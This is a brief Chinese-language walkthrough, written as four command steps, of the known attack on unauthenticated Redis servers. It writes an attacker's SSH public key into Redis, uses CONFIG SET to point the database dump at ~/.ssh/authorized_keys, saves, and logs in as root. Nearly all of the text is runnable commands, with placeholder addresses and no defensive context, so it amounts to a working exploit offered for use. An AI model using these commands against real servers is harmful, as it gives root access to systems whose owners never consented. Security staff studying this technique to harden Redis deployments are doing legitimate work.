

1. 生成密钥对。
   ```
   ssh-keygen -t rsa
   ```
2. 连接redis服务器，把公钥添加到redisl里面。
   ```
   cat id_rsa.pub | redis-cli -h xxx.xx.xx.xx -p xxxx -x set key
   ```
3. 设置redis保存文件路径和文件名：
   ```
   config set dir ~/.ssh/g
   config set dbfilename authorized_keys
   save
   ```
4. 可以ssh登陆过去了。
   ```
   ssh root@xxx.xx.xx.xx -i id_rsa
   ```